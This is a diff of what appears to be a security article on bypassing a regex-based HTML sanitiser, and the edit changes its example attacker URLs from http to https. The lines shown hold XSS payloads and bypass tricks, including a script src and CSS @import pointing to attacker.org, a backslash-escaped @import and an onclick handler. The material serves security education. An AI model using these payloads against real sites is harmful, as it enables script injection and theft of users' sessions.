@@ -34,7 +34,7 @@ Let's look at ways to circumvent this filter. Our goal is to pass some HTML thro
 | Filter regex | Possible exploit |
 | ------------ | ---------------- |
 | `(javascript\s*:)` | `<a href="javascript:alert('xss')">` |
-| `@import` | `@import url(http://attacker.org/malicious.css)` |
+| `@import` | `@import url(https://attacker.org/malicious.css)` |
 | `style=…` | `<div style="color: expression(alert('XSS'))">` |
 | `ondblclick|onclick|…` | `<div onclick="alert('xss')">` | 
 | `<script…` | `<script>alert("XSS")</script>` |
@@ -60,7 +60,7 @@ Besides Javascript there is also VBScript. It is deprecated and disabled in IE11
 Internet Explorer supports Javascript expressions in CSS, called [dynamic properties](https://msdn.microsoft.com/en-us/library/ms537634(v=vs.85).aspx). Allowing an attacker to load an external CSS stylesheet would thus be dangerous, as the attacker can now run Javascript in the context of the original page.
 
     <style>
-    @import url("http://attacker.org/malicious.css");
+    @import url("https://attacker.org/malicious.css");
     </style>
 
 And in malicious.css:
@@ -72,7 +72,7 @@ And in malicious.css:
 We can circumvent the `@import` filter by using a backslash escape character in the CSS:
 
     <style>
-    @imp\ort url("http://attacker.org/malicious.css");
+    @imp\ort url("https://attacker.org/malicious.css");
     </style>
 
 Internet Explorer allows for the backslash and now it passes our filter.
@@ -115,7 +115,7 @@ Another way to circumvent this is to put a space between the attribute and the `
 A script tag can be used to define inline script, or load a script file from another location:
 
     <script>alert("XSS")</script>
-    <script src="http://attacker.org/malicious.js"></script>
+    <script src="https://attacker.org/malicious.js"></script>
 
 Our filter removes any `<script>` tags. However, it only does so once, so we can make sure that the content that we want ends up after removing the tags:
 
